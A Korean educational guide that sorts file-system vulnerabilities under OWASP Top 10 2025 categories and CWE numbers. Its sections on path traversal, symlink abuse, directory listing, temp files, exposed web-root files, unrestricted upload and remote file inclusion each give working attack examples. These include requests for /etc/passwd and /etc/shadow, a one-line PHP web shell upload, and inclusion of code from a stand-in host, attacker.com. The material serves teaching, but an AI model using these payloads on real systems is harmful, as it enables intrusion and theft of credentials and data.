# 파일 시스템 취약점 — OWASP 공식 기준

출처 (2026-10-27 확인, 공식 사이트 원문 직접 대조):
- https://top10.owasp.org/2025/A01_2025-Broken_Access_Control/
- https://top10.owasp.org/2025/A05_2025-Injection/
- https://top10.owasp.org/2025/A06_2025-Insecure_Design/

**분류 위치**: 파일 시스템 관련 취약점은 하나의 카테고리에 모여 있지 않고 세 곳에 흩어져 있습니다.
- **A01 Broken Access Control**: Path Traversal, 심볼릭 링크 악용, 디렉터리 리스팅 노출, 임시 파일, 웹 루트 내 민감 파일 등 대부분의 "파일에 접근하는" 문제.
- **A06 Insecure Design**: 파일명·경로를 외부 입력으로 제어하게 둔 설계, 파일 업로드 유형 제한 누락.
- **A05 Injection**: PHP 환경에서의 Remote File Inclusion (RFI).

> 주의: LFI(Local File Inclusion)라는 이름과 "임의 파일 다운로드"라는 이름 자체는 OWASP CWE 매핑에 없습니다. 아래에서는 실제로 매핑된 CWE를 기준으로 가장 가까운 개념에 연결해서 설명합니다.

---

## 1. Path Traversal (경로 탐색) — 난이도 하

**개념**: 서버가 파일을 읽어줄 때 사용자가 입력한 파일명을 그대로 믿고 경로를 조합하는 경우, 사용자가 `../`(상위 디렉터리로 이동) 같은 문자열을 넣어서 원래 의도한 폴더 바깥의 파일(예: 서버의 비밀번호 파일, 설정 파일)을 읽어낼 수 있습니다. 해당 CWE는 CWE-22(일반), CWE-23(상대 경로), CWE-36(절대 경로)입니다.

**흐름**: 정상 사용자는 `/download?file=report.pdf` 처럼 자기 폴더 안의 파일만 내려받습니다. 공격자는 `file` 파라미터에 `../../../../etc/passwd` 같은 값을 넣어서 서버의 다른 폴더에 있는 파일을 읽어냅니다.

**명령어 예시**:
```
GET /download?file=../../../../etc/passwd
```
Windows 서버라면:
```
GET /download?file=..\..\..\..\windows\win.ini
```
필터링을 우회해야 할 때는 인코딩을 섞습니다:
```
GET /download?file=..%2f..%2f..%2fetc%2fpasswd
```

---

## 2. 심볼릭/하드 링크 악용 (Link Following) — 난이도 중

**개념**: 서버가 파일에 접근하기 전에 "이게 진짜 그 파일인지, 아니면 다른 곳을 가리키는 링크인지"를 확인하지 않으면, 공격자가 미리 만들어둔 심볼릭 링크(symlink, 다른 파일을 가리키는 바로가기 같은 것)를 통해 허용되지 않은 파일에 접근할 수 있습니다. CWE-59(일반 링크), CWE-61(유닉스 심볼릭 링크), CWE-65(윈도우 하드 링크).

**흐름**: 서버가 사용자별 업로드 폴더 안의 파일만 열어주도록 설계했는데, 공격자가 자기 업로드 폴더 안에 "사실은 시스템 설정 파일을 가리키는" 심볼릭 링크를 만들어 넣습니다. 서버가 그 링크를 "진짜 파일"로 착각하고 그대로 읽어줍니다. 공격자가 서버에 파일을 쓸 수 있는 다른 기능(업로드 등)이 먼저 있어야 해서 난이도가 중간입니다.

**명령어 예시** (공격자가 서버 파일 시스템에 직접 명령을 실행할 수 있는 환경을 가정):
```
ln -s /etc/shadow /var/uploads/attacker/myfile.txt
```
그 다음 `/download?file=myfile.txt`로 요청하면, 서버는 symlink를 따라가서 `/etc/shadow` 내용을 돌려줍니다.

---

## 3. 디렉터리 리스팅 노출 (Directory Listing) — 난이도 하

**개념**: 웹 서버 설정에서 "폴더 안의 파일 목록을 그대로 보여주는 기능"이 꺼져 있지 않으면, 공격자가 특정 폴더 주소에 들어가는 것만으로 그 안의 모든 파일 이름을 볼 수 있습니다. 숨겨놓은 파일(백업 파일, 설정 파일)의 이름까지 그대로 노출됩니다. CWE-548.

**흐름**: 공격자는 서버의 여러 폴더 경로를 추측해서 접속해봅니다. 디렉터리 리스팅이 켜져 있으면 그 폴더 안의 파일 목록이 화면에 그대로 뜹니다.

**명령어 예시**:
```
curl https://target/uploads/
curl https://target/backup/
```
화면에 `config.bak`, `db_dump.sql` 같은 파일명이 목록으로 뜨면, 그 이름을 그대로 붙여서 내려받습니다:
```
curl https://target/backup/db_dump.sql -O
```

---

## 4. 안전하지 않은 임시 파일 (Insecure Temporary File) — 난이도 중

**개념**: 서버가 작업 중간에 임시 파일을 만드는데, 그 파일 이름이 예측 가능하거나(예: `temp_1.txt`, `temp_2.txt` 순서대로), 다른 사용자도 읽고 쓸 수 있는 권한으로 생성되는 경우입니다. CWE-377(안전하지 않은 임시 파일), CWE-379(권한이 느슨한 디렉터리에 임시 파일 생성).

**흐름**: 서버가 여러 사용자의 요청을 처리하면서 `/tmp/upload_12345.tmp` 같은 추측 가능한 이름으로 임시 파일을 만듭니다. 공격자는 그 이름 패턴을 추측해서, 다른 사용자가 업로드 처리 중인 파일 내용을 가로채거나, 자기가 먼저 같은 이름의 파일을 만들어서 경쟁 상태(race condition)를 유발합니다.

**명령어 예시** (추측 가능한 패턴을 빠르게 훑는 경우):
```
for i in $(seq 1 1000); do curl -s https://target/tmp/upload_$i.tmp -o /dev/null -w "%{http_code} $i\n"; done
```
200이 뜨는 번호를 찾아 그 파일을 내려받습니다.

---

## 5. 웹 루트 안의 민감 파일 노출 — 난이도 하

**개념**: 서버가 외부에 공개하는 폴더(웹 루트) 안에, 원래는 공개되면 안 되는 설정 파일, 백업 파일, `.git` 폴더 등을 그대로 둔 경우입니다. OWASP 원문: "Disable web server directory listing and ensure file metadata (e.g., .git) and backup files are not present within web roots." CWE-219, CWE-538, CWE-552.

**흐름**: 공격자는 흔히 쓰이는 민감 파일 경로를 하나씩 직접 두드려봅니다. 서버가 그 파일들을 지우거나 접근 차단하지 않았다면 그대로 노출됩니다.

**명령어 예시**:
```
curl https://target/.git/config
curl https://target/.env
curl https://target/backup.zip
curl https://target/wp-config.php.bak
```
`.git` 폴더가 그대로 열려 있다면, 도구로 전체 소스 코드 히스토리까지 복원할 수 있습니다:
```
git-dumper https://target/.git/ ./복원폴더
```

---

## 6. 제한 없는 파일 업로드 (Unrestricted Upload of Dangerous File Type) — 난이도 중

**개념**: 서버가 사용자 업로드 파일의 확장자나 내용을 제대로 검사하지 않아서, 이미지 업로드 기능에 실행 가능한 스크립트 파일(`.php`, `.jsp`, `.asp` 등)을 올릴 수 있는 경우입니다. 업로드된 파일이 웹 서버에서 바로 실행되는 위치에 저장되면, 그 파일을 호출해서 서버 명령을 실행시킬 수 있습니다 (A06 Insecure Design, CWE-434).

**흐름**: 정상 사용자는 프로필 사진으로 `.jpg` 파일을 올립니다. 공격자는 파일 내용은 PHP 코드이면서 확장자만 `.jpg`로 속이거나, 확장자 검사를 우회하는 방법(`.php.jpg`, `.pHp`, null byte 등)으로 실행 가능한 파일을 올립니다.

**명령어 예시**:
```
echo '<?php system($_GET["cmd"]); ?>' > shell.php.jpg
curl -F "file=@shell.php.jpg" https://target/upload
```
업로드가 성공하면, 서버가 실제로는 이 파일을 PHP로 실행하는 경로가 있는지 확인합니다:
```
curl "https://target/uploads/shell.php.jpg?cmd=id"
```

---

## 7. Remote File Inclusion, RFI (PHP 환경 한정) — 난이도 상

**개념**: PHP의 `include`나 `require` 문에 넘기는 파일 경로를 사용자가 통제할 수 있고, 서버 설정이 외부 URL을 그 경로로 받아들이도록 허용되어 있으면, 공격자가 자기 서버에 올려둔 악성 PHP 코드를 대상 서버에서 그대로 실행시킬 수 있습니다 (A05 Injection, CWE-98). 최신 PHP 기본 설정에서는 이 기능(`allow_url_include`)이 꺼져 있어서 실제로 성립하는 경우가 드물어 난이도를 높게 둡니다.

**흐름**: 서버 코드가 `include($_GET['page'] . '.php')` 처럼 사용자가 보낸 값을 그대로 include 경로에 쓴다고 가정합니다. 공격자는 자기 서버에 악성 PHP 파일을 올려두고, 그 URL을 `page` 파라미터에 넣어 보냅니다.

**명령어 예시**:
```
먼저 공격자 서버에 악성 코드 업로드: https://attacker.com/evil.txt
내용: <?php system($_GET['cmd']); ?>

그 다음 대상 서버에: GET /index.php?page=https://attacker.com/evil
```
성공하면 대상 서버가 그 코드를 실행하면서 명령 실행까지 이어집니다:
```
GET /index.php?page=https://attacker.com/evil&cmd=id
```

---

## 참고 — 경계 항목 (파일 개체명은 없지만 파일 권한·소유권과 관련)

CWE-276(기본 권한 오류), CWE-281(권한 보존 오류), CWE-282/283(소유권 관리 오류), CWE-732(중요 자원의 권한 설정 오류)도 A01에 매핑되어 있지만, 이름 자체에 "파일"이 들어있지 않아 참고로만 남겨둡니다. 실제로는 "파일 권한이 너무 느슨하게 설정됨" 같은 문제로 나타나는 경우가 많습니다.
